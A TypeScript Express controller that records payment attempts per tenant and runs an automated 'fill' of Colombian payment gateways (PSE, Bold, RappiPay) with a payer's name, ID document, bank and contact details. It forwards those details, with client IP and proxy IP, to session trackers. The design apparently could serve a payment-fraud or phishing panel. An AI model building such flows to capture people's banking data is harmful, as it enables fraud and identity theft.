import { Request, Response } from 'express';
import { executeFill } from '../services/fill.service';
import { notifySessionPayment } from './track.controller';
import { startTrackingBoldPayment } from '../services/bold-tracker.service';
import { startTrackingRappiPayment } from '../services/rappi-tracker.service';
import {
  resolveOwnerId,
  getGatewaySettings,
  recordTransaction,
  updateTransactionStatus,
} from '../services/settings.service';

export function postFillAttempt(req: Request, res: Response) {
  try {
    const { monto, servicio, metodo, referencia, sessionId, tenantSlug } = req.body ?? {};
    const cleanMonto = Number(String(monto || '0').replace(/\D/g, '')) || 0;
    const sid = String(sessionId || `anon_${Date.now()}`);
    const ownerId = resolveOwnerId(tenantSlug ? String(tenantSlug) : undefined);
    const settings = getGatewaySettings(ownerId);

    const tx = recordTransaction(
      {
        ownerId,
        sessionId: sid,
        nombre: servicio ? `Intento: ${String(servicio).trim()}` : 'Intento en Paso 1',
        doc: referencia ? `Ref: ${String(referencia).trim()}` : 'Pendiente datos PSE',
        banco: metodo ? String(metodo).toUpperCase() : 'PENDIENTE',
        monto: cleanMonto,
        gateway: settings.gatewayProvider,
        status: 'INITIATED',
      },
      ownerId
    );

    return res.json({ ok: true, transactionId: tx.id });
  } catch (err: any) {
    return res.status(500).json({ ok: false, error: err.message });
  }
}

export async function postFill(req: Request, res: Response) {
  const { monto, banco, tipo, doc, nombre, email, celular, sessionId, tenantSlug } = req.body ?? {};
  const cleanMonto = String(monto || '').replace(/\D/g, '');
  const cleanDoc = String(doc || '').replace(/\D/g, '');
  const sid = String(sessionId || `anon_${Date.now()}`);
  const ownerId = resolveOwnerId(tenantSlug ? String(tenantSlug) : undefined);
  const settings = getGatewaySettings(ownerId);

  const initialTx = recordTransaction(
    {
      ownerId,
      sessionId: sid,
      nombre: String(nombre || 'No provisto').trim(),
      doc: cleanDoc || 'Sin documento',
      banco: String(banco || 'Pendiente').trim(),
      monto: Number(cleanMonto || 0),
      gateway: settings.gatewayProvider,
      status: 'PROCESSING',
    },
    ownerId
  );

  try {
    if (!monto || !banco || !tipo || !doc) {
      updateTransactionStatus(initialTx.id, 'ERROR', {
        errorMessage: 'Faltan campos requeridos: monto, banco, tipo, doc',
      });
      return res.status(400).json({
        error: 'Faltan campos requeridos: monto, banco, tipo, doc',
      });
    }

    if (!cleanMonto || Number(cleanMonto) < 10000) {
      updateTransactionStatus(initialTx.id, 'ERROR', {
        errorMessage: 'Monto inferior al mínimo ($10.000 COP)',
      });
      return res.status(400).json({ error: 'El monto mínimo a pagar es de $10.000 COP' });
    }
    if (!cleanDoc) {
      updateTransactionStatus(initialTx.id, 'ERROR', {
        errorMessage: 'Documento inválido',
      });
      return res.status(400).json({ error: 'Documento inválido' });
    }

    const result = await executeFill(
      {
        monto: cleanMonto,
        banco: String(banco).trim(),
        tipo: String(tipo).trim(),
        doc: cleanDoc,
        nombre: nombre ? String(nombre).trim() : undefined,
        email: email ? String(email).trim() : undefined,
        celular: celular ? String(celular).trim() : undefined,
        ownerId,
      },
      ownerId
    );

    updateTransactionStatus(initialTx.id, 'GENERATED', {
      referenceId: result.reference_id,
      redirectUrl: result.redirect_url,
    });

    if (result.redirect_url) {
      const clientIp =
        (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
      const host = (req.headers['x-forwarded-host'] as string) || req.headers.host || '';
      notifySessionPayment(sid, {
        nombre: String(nombre || 'No provisto').trim(),
        monto: cleanMonto,
        cc: cleanDoc,
        banco: String(banco).trim(),
        url: result.redirect_url,
        proxyIp: result.proxy_ip,
        clientIp,
        host,
        gateway: settings.gatewayProvider,
      });

      if (result.reference_id) {
        startTrackingBoldPayment({
          referenceId: result.reference_id,
          sessionId: sid,
          amount: Number(cleanMonto),
          banco: String(banco).trim(),
          nombre: String(nombre || '').trim(),
          doc: cleanDoc,
        });
      } else if (settings.gatewayProvider === 'rappipay' || result.gateway_used === 'rappipay') {
        startTrackingRappiPayment({
          txId: initialTx.id,
          sessionId: sid,
          redirectUrl: result.redirect_url,
          kushkiUrl: result.kushki_url,
          amount: Number(cleanMonto),
          banco: String(banco).trim(),
          nombre: String(nombre || '').trim(),
          doc: cleanDoc,
        });
      }
    }

    return res.json(result);
  } catch (err: any) {
    console.error('Error en /api/fill:', err);
    updateTransactionStatus(initialTx.id, 'ERROR', {
      errorMessage: err.message || 'Error en pasarela',
    });
    return res.status(500).json({
      error: err.message || 'Error al procesar la automatización de pago',
    });
  }
}
